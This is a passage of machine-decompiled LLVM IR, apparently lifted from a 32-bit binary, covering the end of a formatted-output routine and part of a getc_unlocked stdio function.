  %v0_8052932 = load i32, i32* %ebp.global-to-local, align 4
  %v1_8052932 = load i32, i32* @ecx, align 4
  %v2_8052932 = add i32 %v1_8052932, 4
  %v3_8052932 = inttoptr i32 %v2_8052932 to i32*
  store i32 %v0_8052932, i32* %v3_8052932, align 4
  %v0_8052935 = load i32, i32* @ecx, align 4
  %v1_8052935 = add i32 %v0_8052935, 8
  %v2_8052935 = inttoptr i32 %v1_8052935 to i32*
  store i32 ptrtoint (i32* @global_var_8057953.229 to i32), i32* %v2_8052935, align 4
  %v0_805293c = load i32, i32* @ecx, align 4
  %v1_805293c = add i32 %v0_805293c, 12
  store i32 %v1_805293c, i32* @ecx, align 4
  br label %dec_label_pc_805293f

dec_label_pc_805293f:                             ; preds = %dec_label_pc_8052922, %dec_label_pc_8052915, %dec_label_pc_805292a
  %v1_80529c7121 = phi i32 [ %v0_805292c, %dec_label_pc_8052922 ], [ %v0_805292c, %dec_label_pc_8052915 ], [ %v1_805293c, %dec_label_pc_805292a ]
  %v12_805293f = icmp eq i8 %stack_var_-197.2, 102
  br i1 %v12_805293f, label %dec_label_pc_80529ba, label %dec_label_pc_8052946

dec_label_pc_8052946:                             ; preds = %dec_label_pc_805293f
  %v5_8052946 = load i32, i32* %edx.global-to-local, align 4
  %v6_8052946 = and i32 %v5_8052946, -256
  %v7_8052946 = or i32 %v6_8052946, %stack_var_-42.0
  store i32 %v7_8052946, i32* %edx.global-to-local, align 4
  %v0_805294d = load i32, i32* %esi.global-to-local, align 4
  %v2_805294d = icmp slt i32 %v0_805294d, 0
  %v1_805294f = trunc i32 %stack_var_-42.0 to i8
  br i1 %v2_805294d, label %dec_label_pc_805295e, label %dec_label_pc_8052967

dec_label_pc_805295e:                             ; preds = %dec_label_pc_8052946
  store i32 %v0_805294d, i32* %edx.global-to-local, align 4
  %v1_8052960 = sub i32 0, %v0_805294d
  br label %dec_label_pc_8052967

dec_label_pc_8052967:                             ; preds = %dec_label_pc_8052946, %dec_label_pc_805295e
  %storemerge27 = phi i32 [ %v1_8052960, %dec_label_pc_805295e ], [ %v0_805294d, %dec_label_pc_8052946 ]
  %storemerge9 = phi i8 [ 45, %dec_label_pc_805295e ], [ 43, %dec_label_pc_8052946 ]
  store i32 %storemerge27, i32* %edx.global-to-local, align 4
  store i32 0, i32* %stack_var_-27, align 4
  %v2_805296f = ptrtoint i32* %stack_var_-27 to i32
  store i32 %v2_805296f, i32* %ebx.global-to-local, align 4
  store i32 2, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_805297b

dec_label_pc_805297b:                             ; preds = %dec_label_pc_805297b.backedge, %dec_label_pc_8052967
  %v0_8052986 = phi i32 [ %v0_8052986.pre, %dec_label_pc_805297b.backedge ], [ %v2_805296f, %dec_label_pc_8052967 ]
  %v0_8052983 = phi i32 [ %v0_8052983.pre, %dec_label_pc_805297b.backedge ], [ 2, %dec_label_pc_8052967 ]
  %v0_805297b = phi i32 [ %v9_8052984, %dec_label_pc_805297b.backedge ], [ %storemerge27, %dec_label_pc_8052967 ]
  %v1_8052982 = ashr i32 %v0_805297b, 31
  %v1_8052983 = add i32 %v0_8052983, 1
  store i32 %v1_8052983, i32* %edi.global-to-local, align 4
  %v2_8052984 = zext i32 %v0_805297b to i64
  %v4_8052984 = zext i32 %v1_8052982 to i64
  %v5_8052984 = mul nuw i64 %v4_8052984, 4294967296
  %v6_8052984 = or i64 %v5_8052984, %v2_8052984
  %v8_8052984 = sdiv i64 %v6_8052984, 10
  %v9_8052984 = trunc i64 %v8_8052984 to i32
  %v10_8052984 = srem i64 %v6_8052984, 10
  %v1_8052986 = add i32 %v0_8052986, -1
  store i32 %v1_8052986, i32* %ebx.global-to-local, align 4
  store i32 %v9_8052984, i32* %esi.global-to-local, align 4
  %v3_8052989 = and i32 %v9_8052984, -256
  %v1_805298b = trunc i64 %v10_8052984 to i8
  %v2_805298b = add i8 %v1_805298b, 48
  %v12_805298b = zext i8 %v2_805298b to i32
  %v15_805298b = or i32 %v12_805298b, %v3_8052989
  store i32 %v15_805298b, i32* %eax.global-to-local, align 4
  %v3_8052990 = inttoptr i32 %v1_8052986 to i8*
  store i8 %v2_805298b, i8* %v3_8052990, align 1
  store i32 %v9_8052984, i32* %edx.global-to-local, align 4
  %v7_8052994 = icmp sgt i32 %v1_8052983, 3
  br i1 %v7_8052994, label %dec_label_pc_8052996, label %dec_label_pc_805297b.backedge

dec_label_pc_8052996:                             ; preds = %dec_label_pc_805297b
  %v2_8052996 = icmp eq i32 %v9_8052984, 0
  %v1_8052998 = icmp eq i1 %v2_8052996, false
  br i1 %v1_8052998, label %dec_label_pc_805297b.backedge, label %dec_label_pc_805299a

dec_label_pc_805297b.backedge:                    ; preds = %dec_label_pc_8052996, %dec_label_pc_805297b
  %v0_8052983.pre = load i32, i32* %edi.global-to-local, align 4
  %v0_8052986.pre = load i32, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805297b

dec_label_pc_805299a:                             ; preds = %dec_label_pc_8052996
  %v4_805299a = zext i8 %storemerge9 to i32
  %v7_805299a = or i32 %v3_8052989, %v4_805299a
  store i32 %v7_805299a, i32* %edx.global-to-local, align 4
  %v0_805299e = load i32, i32* %ebx.global-to-local, align 4
  %v1_805299e = add i32 %v0_805299e, -2
  store i32 %v1_805299e, i32* %eax.global-to-local, align 4
  %v3_80529a1 = add i32 %v0_805299e, -1
  %v4_80529a1 = inttoptr i32 %v3_80529a1 to i8*
  store i8 %storemerge9, i8* %v4_80529a1, align 1
  %v5_80529a4 = load i32, i32* %edx.global-to-local, align 4
  %v6_80529a4 = and i32 %v5_80529a4, -256
  %v7_80529a4 = or i32 %v6_80529a4, %stack_var_-42.0
  store i32 %v7_80529a4, i32* %edx.global-to-local, align 4
  %v2_80529a8 = load i32, i32* %ebx.global-to-local, align 4
  %v3_80529a8 = add i32 %v2_80529a8, -2
  %v4_80529a8 = inttoptr i32 %v3_80529a8 to i8*
  store i8 %v1_805294f, i8* %v4_80529a8, align 1
  %v0_80529ab = load i32, i32* @ecx, align 4
  %v1_80529ab = inttoptr i32 %v0_80529ab to i32*
  store i32 112, i32* %v1_80529ab, align 4
  %v0_80529b1 = load i32, i32* %edi.global-to-local, align 4
  %v1_80529b1 = load i32, i32* @ecx, align 4
  %v2_80529b1 = add i32 %v1_80529b1, 4
  %v3_80529b1 = inttoptr i32 %v2_80529b1 to i32*
  store i32 %v0_80529b1, i32* %v3_80529b1, align 4
  %v0_80529b4 = load i32, i32* %eax.global-to-local, align 4
  %v1_80529b4 = load i32, i32* @ecx, align 4
  %v2_80529b4 = add i32 %v1_80529b4, 8
  %v3_80529b4 = inttoptr i32 %v2_80529b4 to i32*
  store i32 %v0_80529b4, i32* %v3_80529b4, align 4
  %v0_80529b7 = load i32, i32* @ecx, align 4
  %v1_80529b7 = add i32 %v0_80529b7, 12
  store i32 %v1_80529b7, i32* @ecx, align 4
  br label %dec_label_pc_80529ba

dec_label_pc_80529ba:                             ; preds = %dec_label_pc_805293f, %dec_label_pc_80525e9, %dec_label_pc_805299a
  %v0_8052a39 = phi i32 [ %v1_80529c7121, %dec_label_pc_805293f ], [ %v2_80525f1, %dec_label_pc_80525e9 ], [ %v1_80529b7, %dec_label_pc_805299a ]
  %v2_80529ba = ptrtoint i32* %stack_var_-152 to i32
  store i32 %v2_80529ba, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_80529be

dec_label_pc_80529be:                             ; preds = %dec_label_pc_80529be, %dec_label_pc_80529ba
  %v0_80529be = phi i32 [ %v2_80529ba, %dec_label_pc_80529ba ], [ %v1_80529c0, %dec_label_pc_80529be ]
  %stack_var_-216.0 = phi i32 [ %v3_80524eb, %dec_label_pc_80529ba ], [ %v5_80529c3, %dec_label_pc_80529be ]
  %v1_80529be = inttoptr i32 %v0_80529be to i32*
  %v2_80529be = load i32, i32* %v1_80529be, align 4
  store i32 %v2_80529be, i32* %ebx.global-to-local, align 4
  %v1_80529c0 = add i32 %v0_80529be, 12
  store i32 %v1_80529c0, i32* %eax.global-to-local, align 4
  %v5_80529c3 = sub i32 %stack_var_-216.0, %v2_80529be
  %v7_80529c7 = icmp ult i32 %v1_80529c0, %v0_8052a39
  br i1 %v7_80529c7, label %dec_label_pc_80529be, label %dec_label_pc_80529cb

dec_label_pc_80529cb:                             ; preds = %dec_label_pc_80529be
  store i32 %v0_8052a39, i32* %esi.global-to-local, align 4
  %v5_80529de = icmp eq i8 %stack_var_-26.0, 0
  store i32 160, i32* %stack_var_-168, align 4
  %v1_80529ee = icmp eq i1 %v5_80529de, false
  %v2_80529ee = zext i1 %v1_80529ee to i32
  store i32 %v2_80529ee, i32* %edx.global-to-local, align 4
  %v2_80529f1 = sub i32 %v5_80529c3, %v2_80529ee
  store i32 %v2_80529f1, i32* %eax.global-to-local, align 4
  %tmp190 = icmp slt i32 %v2_80529f1, 1
  br i1 %tmp190, label %dec_label_pc_8052a3b, label %dec_label_pc_80529fb

dec_label_pc_80529fb:                             ; preds = %dec_label_pc_80529cb
  store i32 %tmp156, i32* %edx.global-to-local, align 4
  %v2_8052a02 = inttoptr i32 %v1_805252b to i8*
  %v3_8052a02 = load i8, i8* %v2_8052a02, align 1
  %v4_8052a02 = and i8 %v3_8052a02, 8
  %v5_8052a02 = icmp eq i8 %v4_8052a02, 0
  br i1 %v5_8052a02, label %dec_label_pc_8052a1d, label %dec_label_pc_8052a08

dec_label_pc_8052a08:                             ; preds = %dec_label_pc_80529fb
  %v1_8052a08 = add i32 %v0_8052a39, 12
  store i32 %v1_8052a08, i32* %esi.global-to-local, align 4
  %v1_8052a0b = inttoptr i32 %v0_8052a39 to i32*
  store i32 160, i32* %v1_8052a0b, align 4
  %v1_8052a11 = load i32, i32* @ecx, align 4
  %v2_8052a11 = add i32 %v1_8052a11, 4
  %v3_8052a11 = inttoptr i32 %v2_8052a11 to i32*
  store i32 %v2_80529f1, i32* %v3_8052a11, align 4
  %v0_8052a14 = load i32, i32* @ecx, align 4
  %v1_8052a14 = add i32 %v0_8052a14, 8
  %v2_8052a14 = inttoptr i32 %v1_8052a14 to i32*
  store i32 ptrtoint (i32* @global_var_8057953.229 to i32), i32* %v2_8052a14, align 4
  br label %dec_label_pc_8052a3b

dec_label_pc_8052a1d:                             ; preds = %dec_label_pc_80529fb
  store i32 %tmp156, i32* %ebx.global-to-local, align 4
  %v1_8052a24 = add i32 %tmp156, 16
  %v2_8052a24 = inttoptr i32 %v1_8052a24 to i32*
  %v3_8052a24 = load i32, i32* %v2_8052a24, align 4
  %v9_8052a24 = icmp eq i32 %v3_8052a24, 48
  %v1_8052a28 = icmp eq i1 %v9_8052a24, false
  br i1 %v1_8052a28, label %dec_label_pc_8052a35, label %dec_label_pc_8052a2a

dec_label_pc_8052a2a:                             ; preds = %dec_label_pc_8052a1d
  %v3_8052a2a = load i32, i32* %stack_var_-152, align 4
  %v5_8052a2a = add i32 %v3_8052a2a, %v2_80529f1
  store i32 %v5_8052a2a, i32* %stack_var_-152, align 4
  br label %dec_label_pc_8052a39

dec_label_pc_8052a30:                             ; preds = %dec_label_pc_8052a41
  store i32 -1, i32* %edi.global-to-local, align 4
  br label %dec_label_pc_8052a68

dec_label_pc_8052a35:                             ; preds = %dec_label_pc_8052a1d
  br label %dec_label_pc_8052a39

dec_label_pc_8052a39:                             ; preds = %dec_label_pc_8052a2a, %dec_label_pc_8052a35
  store i32 %v0_8052a39, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_8052a3b

dec_label_pc_8052a3b:                             ; preds = %dec_label_pc_80529cb, %dec_label_pc_8052a08, %dec_label_pc_8052a39
  store i32 0, i32* %edi.global-to-local, align 4
  %v2_8052a3d = ptrtoint i32* %stack_var_-168 to i32
  store i32 %v2_8052a3d, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_8052a41

dec_label_pc_8052a41:                             ; preds = %dec_label_pc_8052a5f, %dec_label_pc_8052a3b
  call void @__pseudo_call(i32 %tmp156)
  %v1_8052a5a = load i32, i32* %ebx.global-to-local, align 4
  %v2_8052a5a = add i32 %v1_8052a5a, 4
  %v3_8052a5a = inttoptr i32 %v2_8052a5a to i32*
  %v4_8052a5a = load i32, i32* %v3_8052a5a, align 4
  %v15_8052a5a = icmp eq i32 %v2_80529f1, %v4_8052a5a
  %v1_8052a5d = icmp eq i1 %v15_8052a5a, false
  br i1 %v1_8052a5d, label %dec_label_pc_8052a30, label %dec_label_pc_8052a5f

dec_label_pc_8052a5f:                             ; preds = %dec_label_pc_8052a41
  %v1_8052a5f = add i32 %v1_8052a5a, 12
  store i32 %v1_8052a5f, i32* %ebx.global-to-local, align 4
  %v0_8052a62 = load i32, i32* %edi.global-to-local, align 4
  %v2_8052a62 = add i32 %v0_8052a62, %v2_80529f1
  store i32 %v2_8052a62, i32* %edi.global-to-local, align 4
  %v1_8052a64 = load i32, i32* %esi.global-to-local, align 4
  %v7_8052a64 = icmp ult i32 %v1_8052a5f, %v1_8052a64
  br i1 %v7_8052a64, label %dec_label_pc_8052a41, label %dec_label_pc_8052a68

dec_label_pc_8052a68:                             ; preds = %dec_label_pc_8052a5f, %dec_label_pc_8052a30
  %v0_8052a6e = phi i32 [ -1, %dec_label_pc_8052a30 ], [ %v2_8052a62, %dec_label_pc_8052a5f ]
  store i32 %v0_8052a6e, i32* %eax.global-to-local, align 4
  %v2_8052a71 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_8052a71, i32* @esi, align 4
  store i32 %v0_80524ce, i32* @edi, align 4
  store i32 %v0_80524cd, i32* @ebp, align 4
  ret i32 %v0_8052a6e

; uselistorder directives
  uselistorder i32 %v0_8052a6e, { 1, 0 }
  uselistorder i32 %v2_80529f1, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32 %v2_80529ee, { 1, 0 }
  uselistorder i32 %v1_80529c0, { 1, 2, 0 }
  uselistorder i32 %v0_80529be, { 1, 0 }
  uselistorder i32 %v0_8052a39, { 1, 3, 2, 4, 0 }
  uselistorder i32 %v9_8052984, { 3, 2, 1, 0, 4 }
  uselistorder i8 %storemerge9, { 1, 0 }
  uselistorder i32 %v0_805294d, { 2, 1, 0, 3 }
  uselistorder i32 %v2_8052926, { 1, 0 }
  uselistorder i32 %v1_8052926, { 1, 0, 2 }
  uselistorder i32 %v2_8052924, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_80528e1, { 1, 0 }
  uselistorder i32 %v2_805284e, { 2, 1, 3, 0 }
  uselistorder i32 %v2_8052848, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v1_80528a5, { 4, 0, 3, 1, 2, 5, 6, 7 }
  uselistorder i32 %v1_80527e4, { 1, 0 }
  uselistorder i32 %v0_80527df, { 1, 2, 0, 3 }
  uselistorder i32 %v2_80527ac, { 1, 2, 3, 0, 4 }
  uselistorder i8 %v2_80527a7, { 1, 0 }
  uselistorder i8 %v2_80527a0, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v0_80527a0, { 1, 0, 3, 2 }
  uselistorder i32 %stack_var_-220.3, { 1, 0 }
  uselistorder i32 %v0_805272a, { 1, 2, 0 }
  uselistorder i32 %stack_var_-42.0, { 0, 2, 1 }
  uselistorder i8 %stack_var_-207.1, { 4, 3, 1, 5, 0, 2 }
  uselistorder i8 %v4_805270f, { 1, 0 }
  uselistorder i32 %tmp195, { 3, 1, 2, 0 }
  uselistorder x86_fp80 %v3_80526da, { 1, 0 }
  uselistorder i32 %v2_8052693, { 2, 1, 0 }
  uselistorder i32 %v0_8052749, { 1, 2, 0, 3 }
  uselistorder x86_fp80 %v1_8052665, { 1, 0 }
  uselistorder x86_fp80 %v3_8052647, { 2, 0, 1, 3, 6, 7, 5, 8, 4, 9, 10 }
  uselistorder i32 %v3_8052644, { 1, 0 }
  uselistorder x86_fp80 %v4_805262c, { 2, 0, 1, 3, 4 }
  uselistorder x86_fp80 %v3_8052626, { 1, 2, 0 }
  uselistorder i32 %v3_8052623, { 1, 0 }
  uselistorder i32 %v1_805261c, { 3, 0, 1, 2 }
  uselistorder i32 %stack_var_-220.0, { 2, 0, 1 }
  uselistorder x86_fp80 %v1_8052655, { 8, 1, 2, 5, 3, 4, 6, 0, 7, 9 }
  uselistorder x86_fp80 %v2_805261d, { 1, 0 }
  uselistorder i8 %v4_80525cd, { 1, 0 }
  uselistorder i3 %v1_805256a, { 1, 0, 2 }
  uselistorder i8 %stack_var_-207.0, { 3, 2, 0, 4, 5, 1, 6, 7 }
  uselistorder i8 %v3_80524f2, { 1, 0, 2, 3 }
  uselistorder i32 %v3_80524eb, { 1, 0, 2 }
  uselistorder i3 %v4_80524e4, { 0, 2, 1, 3 }
  uselistorder i32* %stack_var_-144, { 1, 0, 2 }
  uselistorder i32* %stack_var_-72, { 1, 0, 2 }
  uselistorder i32* %stack_var_-71, { 1, 0 }
  uselistorder i32* %stack_var_-132, { 2, 0, 1 }
  uselistorder i32* %stack_var_-27, { 1, 0 }
  uselistorder i32* %stack_var_-152, { 0, 1, 4, 2, 3 }
  uselistorder i32* %stack_var_-168, { 1, 0 }
  uselistorder i32 %tmp156, { 14, 13, 12, 11, 10, 9, 8, 7, 0, 6, 1, 2, 3, 5, 4 }
  uselistorder x86_fp80 %tmp155, { 3, 2, 1, 0, 4, 5 }
  uselistorder x86_fp80* %st1.global-to-local, { 3, 2, 4, 8, 7, 5, 0, 1, 10, 12, 9, 11, 6 }
  uselistorder x86_fp80* %st0.global-to-local, { 1, 7, 8, 0, 2, 3, 5, 4, 6 }
  uselistorder i3* %fpu_stat_TOP.global-to-local, { 0, 4, 5, 6, 7, 8, 1, 9, 10, 2, 3 }
  uselistorder i32* %esi.global-to-local, { 2, 0, 1, 3, 4, 6, 8, 7, 5, 9, 10, 11, 12 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 4, 5, 27, 6, 7, 10, 12, 11, 13, 8, 9, 14, 17, 15, 18, 16, 19, 20, 21, 22, 23, 28, 24, 25, 26 }
  uselistorder i32* %edi.global-to-local, { 0, 2, 3, 1, 5, 4, 6, 7, 9, 8, 10 }
  uselistorder i32* %ebx.global-to-local, { 0, 1, 2, 3, 4, 6, 7, 5, 8, 9, 10, 11, 26, 12, 13, 27, 14, 15, 16, 17, 21, 22, 18, 19, 20, 23, 24, 25, 28, 29 }
  uselistorder i32* %ebp.global-to-local, { 0, 1, 4, 5, 2, 6, 8, 3, 7, 9, 10 }
  uselistorder i32* %eax.global-to-local, { 0, 1, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 2, 3, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32 }
  uselistorder i64 10, { 1, 0, 2 }
  uselistorder i8 43, { 2, 1, 0 }
  uselistorder i8 45, { 2, 3, 1, 0, 4 }
  uselistorder i8 56, { 1, 0 }
  uselistorder i8 102, { 2, 3, 1, 0 }
  uselistorder i8 103, { 1, 2, 0 }
  uselistorder x86_fp80 0xK401CEE6B280000000000, { 1, 2, 0 }
  uselistorder i32 4096, { 2, 15, 3, 17, 18, 4, 16, 8, 13, 14, 5, 6, 9, 11, 10, 1, 12, 0, 7 }
  uselistorder i32 13, { 0, 5, 4, 1, 2, 3 }
  uselistorder x86_fp80 0xK3FFD8000000000000000, { 1, 0, 2, 3 }
  uselistorder x86_fp80 0xK00000000000000000000, { 0, 2, 3, 4, 1 }
  uselistorder i8 6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a3b, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052a39, { 1, 0 }
  uselistorder label %dec_label_pc_80529ba, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052967, { 1, 0 }
  uselistorder label %dec_label_pc_805293f, { 2, 0, 1 }
  uselistorder label %dec_label_pc_805290e, { 1, 0 }
  uselistorder label %dec_label_pc_80528fb, { 1, 0 }
  uselistorder label %dec_label_pc_80528e1, { 2, 0, 1 }
  uselistorder label %dec_label_pc_80528ae, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052899, { 1, 0 }
  uselistorder label %dec_label_pc_805288e, { 1, 0 }
  uselistorder label %dec_label_pc_8052815, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052807, { 2, 1, 0 }
  uselistorder label %dec_label_pc_80527cd, { 1, 0 }
  uselistorder label %dec_label_pc_805279d.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_8052769, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8052738, { 0, 2, 1 }
  uselistorder label %dec_label_pc_8052723, { 1, 0 }
  uselistorder label %dec_label_pc_805268f, { 1, 0 }
  uselistorder label %dec_label_pc_8052667, { 2, 0, 1 }
  uselistorder label %dec_label_pc_8052665, { 2, 1, 0 }
  uselistorder label %dec_label_pc_8052655, { 1, 0 }
  uselistorder label %dec_label_pc_80525e9, { 1, 0 }
  uselistorder label %dec_label_pc_8052512, { 1, 0 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_6()
  %stack_var_-5 = alloca i8, align 1
  %v0_8052a78 = load i32, i32* @ebx, align 4
  %v4_8052a7c = ptrtoint i16* %tmp to i32
  store i32 %v4_8052a7c, i32* @ebx, align 4
  %v1_8052a80 = add i32 %v4_8052a7c, 16
  %v2_8052a80 = inttoptr i32 %v1_8052a80 to i32*
  %v3_8052a80 = load i32, i32* %v2_8052a80, align 4
  %v2_8052a83 = add i32 %v4_8052a7c, 24
  %v3_8052a83 = inttoptr i32 %v2_8052a83 to i32*
  %v4_8052a83 = load i32, i32* %v3_8052a83, align 4
  %v10_8052a83 = icmp ult i32 %v3_8052a80, %v4_8052a83
  br i1 %v10_8052a83, label %dec_label_pc_8052b25, label %dec_label_pc_8052a8c

dec_label_pc_8052a8c:                             ; preds = %entry
  %v2_8052a8c = load i16, i16* %tmp, align 2
  %v3_8052a8c = zext i16 %v2_8052a8c to i32
  %v1_8052a8f = and i32 %v3_8052a8c, 131
  %v6_8052a99 = icmp ugt i32 %v1_8052a8f, 128
  br i1 %v6_8052a99, label %dec_label_pc_8052ab3, label %dec_label_pc_8052a9b

dec_label_pc_8052a9b:                             ; preds = %dec_label_pc_8052a8c
  %v0_8052a9b = load i32, i32* @edx, align 4
  %v6_8052aa3 = call i32 @__stdio_trans2r_o(i16* nonnull %tmp, i32 128, i32 %v0_8052a9b, i32 %v0_8052a9b)
  %v1_8052aab = icmp eq i32 %v6_8052aa3, 0
  %v1_8052aad = icmp eq i1 %v1_8052aab, false
  br i1 %v1_8052aad, label %dec_label_pc_8052b4a, label %dec_label_pc_8052a9b.dec_label_pc_8052ab3_crit_edge

dec_label_pc_8052a9b.dec_label_pc_8052ab3_crit_edge: ; preds = %dec_label_pc_8052a9b
  %v0_8052ab3.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052ab3

dec_label_pc_8052ab3:                             ; preds = %dec_label_pc_8052a9b.dec_label_pc_8052ab3_crit_edge, %dec_label_pc_8052a8c
  %v2_8052ae7 = phi i32 [ %v0_8052ab3.pre, %dec_label_pc_8052a9b.dec_label_pc_8052ab3_crit_edge ], [ %v4_8052a7c, %dec_label_pc_8052a8c ]
  %v1_8052ab3 = inttoptr i32 %v2_8052ae7 to i16*
  %v2_8052ab3 = load i16, i16* %v1_8052ab3, align 2
  %v3_8052ab3 = zext i16 %v2_8052ab3 to i32
  store i32 %v3_8052ab3, i32* @ecx, align 4
  %v2_8052ab6 = and i16 %v2_8052ab3, 2
  %v3_8052ab6 = icmp eq i16 %v2_8052ab6, 0
  br i1 %v3_8052ab6, label %dec_label_pc_8052ad6, label %dec_label_pc_8052abb

dec_label_pc_8052abb:                             ; preds = %dec_label_pc_8052ab3
  %tmp20 = urem i16 %v2_8052ab3, 2
  %v1_8052abd = zext i16 %tmp20 to i32
  %tmp19 = sub nsw i32 0, %v1_8052abd
  %v2_8052ac0 = and i32 %tmp19, 4
  %v3_8052ac0 = add i32 %v2_8052ae7, 36
  %v4_8052ac0 = add i32 %v3_8052ac0, %v2_8052ac0
  %v5_8052ac0 = inttoptr i32 %v4_8052ac0 to i8*
  %v6_8052ac0 = load i8, i8* %v5_8052ac0, align 1
  %v7_8052ac0 = zext i8 %v6_8052ac0 to i32
  %v8_8052ac0 = load i32, i32* @edx, align 4
  %v9_8052ac0 = and i32 %v8_8052ac0, -256
  %v10_8052ac0 = or i32 %v9_8052ac0, %v7_8052ac0
  store i32 %v10_8052ac0, i32* %edx.global-to-local, align 4
  %v1_8052ac4 = add i16 %v2_8052ab3, -1
  store i16 %v1_8052ac4, i16* %v1_8052ab3, align 2
  %v0_8052aca = load i32, i32* @ebx, align 4
  %v1_8052aca = add i32 %v0_8052aca, 40
  %v2_8052aca = inttoptr i32 %v1_8052aca to i32*
  store i32 0, i32* %v2_8052aca, align 4
  %v0_8052ad1 = load i32, i32* %edx.global-to-local, align 4
  %v1_8052ad1 = urem i32 %v0_8052ad1, 256
  store i32 %v1_8052ad1, i32* @edx, align 4
  br label %dec_label_pc_8052b4d

dec_label_pc_8052ad6:                             ; preds = %dec_label_pc_8052ab3
  %v1_8052ad6 = add i32 %v2_8052ae7, 16
  %v2_8052ad6 = inttoptr i32 %v1_8052ad6 to i32*
  %v3_8052ad6 = load i32, i32* %v2_8052ad6, align 4
  store i32 %v3_8052ad6, i32* @eax, align 4
  %v1_8052ad9 = add i32 %v2_8052ae7, 20
  %v2_8052ad9 = inttoptr i32 %v1_8052ad9 to i32*
  %v3_8052ad9 = load i32, i32* %v2_8052ad9, align 4
  %v15_8052ad9 = icmp eq i32 %v3_8052ad9, %v3_8052ad6
  %v1_8052adc = icmp eq i1 %v15_8052ad9, false
  br i1 %v1_8052adc, label %dec_label_pc_8052b25, label %dec_label_pc_8052ade

dec_label_pc_8052ade:                             ; preds = %dec_label_pc_8052ad6
  %v1_8052ade = add i32 %v2_8052ae7, 4
  %v2_8052ade = inttoptr i32 %v1_8052ade to i32*
  %v3_8052ade = load i32, i32* %v2_8052ade, align 4
  %v13_8052ade = icmp eq i32 %v3_8052ade, -2
  %v1_8052ae2 = icmp eq i1 %v13_8052ade, false
  br i1 %v1_8052ae2, label %dec_label_pc_8052aec, label %dec_label_pc_8052ae4

dec_label_pc_8052ae4:                             ; preds = %dec_label_pc_8052ade
  %v1_8052ae4 = or i32 %v3_8052ab3, 4
  store i32 %v1_8052ae4, i32* @ecx, align 4
  %v1_8052ae7 = trunc i32 %v1_8052ae4 to i16
  store i16 %v1_8052ae7, i16* %v1_8052ab3, align 2
  br label %dec_label_pc_8052b4a

dec_label_pc_8052aec:                             ; preds = %dec_label_pc_8052ade
  %v3_8052aec = and i16 %v2_8052ab3, 768
  %v4_8052aec = icmp eq i16 %v3_8052aec, 0
  br i1 %v4_8052aec, label %dec_label_pc_8052b01, label %dec_label_pc_8052af1

dec_label_pc_8052af1:                             ; preds = %dec_label_pc_8052aec
  %v3_8052af9 = call i32 @fflush_unlocked(i16* bitcast (i32** @global_var_8058238.153 to i16*))
  %v0_8052b01.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_8052b01

dec_label_pc_8052b01:                             ; preds = %dec_label_pc_8052aec, %dec_label_pc_8052af1
  %v0_8052b36 = phi i32 [ %v2_8052ae7, %dec_label_pc_8052aec ], [ %v0_8052b01.pre, %dec_label_pc_8052af1 ]
  %v1_8052b01 = add i32 %v0_8052b36, 8
  %v2_8052b01 = inttoptr i32 %v1_8052b01 to i32*
  %v3_8052b01 = load i32, i32* %v2_8052b01, align 4
  %v1_8052b04 = add i32 %v0_8052b36, 12
  %v2_8052b04 = inttoptr i32 %v1_8052b04 to i32*
  %v3_8052b04 = load i32, i32* %v2_8052b04, align 4
  %v15_8052b04 = icmp eq i32 %v3_8052b04, %v3_8052b01
  br i1 %v15_8052b04, label %dec_label_pc_8052b2e, label %dec_label_pc_8052b09

dec_label_pc_8052b09:                             ; preds = %dec_label_pc_8052b01
  %v2_8052b0c = add i32 %v0_8052b36, 24
  %v3_8052b0c = inttoptr i32 %v2_8052b0c to i32*
  store i32 %v3_8052b01, i32* %v3_8052b0c, align 4
  %v0_8052b0f = load i32, i32* @ebx, align 4
  %v2_8052b10 = call i32 @__stdio_rfill(i32 %v0_8052b0f)
  %v1_8052b18 = icmp eq i32 %v2_8052b10, 0
  br i1 %v1_8052b18, label %dec_label_pc_8052b4a, label %dec_label_pc_8052b1c

dec_label_pc_8052b1c:                             ; preds = %dec_label_pc_8052b09
  %v0_8052b1c = load i32, i32* @ebx, align 4
  %v1_8052b1c = add i32 %v0_8052b1c, 20
  %v2_8052b1c = inttoptr i32 %v1_8052b1c to i32*
  %v3_8052b1c = load i32, i32* %v2_8052b1c, align 4
  %v2_8052b1f = add i32 %v0_8052b1c, 24
  %v3_8052b1f = inttoptr i32 %v2_8052b1f to i32*
  store i32 %v3_8052b1c, i32* %v3_8052b1f, align 4
  %v0_8052b22 = load i32, i32* @ebx, align 4
  %v1_8052b22 = add i32 %v0_8052b22, 16
  %v2_8052b22 = inttoptr i32 %v1_8052b22 to i32*
  %v3_8052b22 = load i32, i32* %v2_8052b22, align 4
  br label %dec_label_pc_8052b25

dec_label_pc_8052b25:                             ; preds = %entry, %dec_label_pc_8052ad6, %dec_label_pc_8052b1c
  %v1_8052b29 = phi i32 [ %v4_8052a7c, %entry ], [ %v2_8052ae7, %dec_label_pc_8052ad6 ], [ %v0_8052b22, %dec_label_pc_8052b1c ]
  %v0_8052b25 = phi i32 [ %v3_8052a80, %entry ], [ %v3_8052ad6, %dec_label_pc_8052ad6 ], [ %v3_8052b22, %dec_label_pc_8052b1c ]
  %v1_8052b25 = inttoptr i32 %v0_8052b25 to i8*
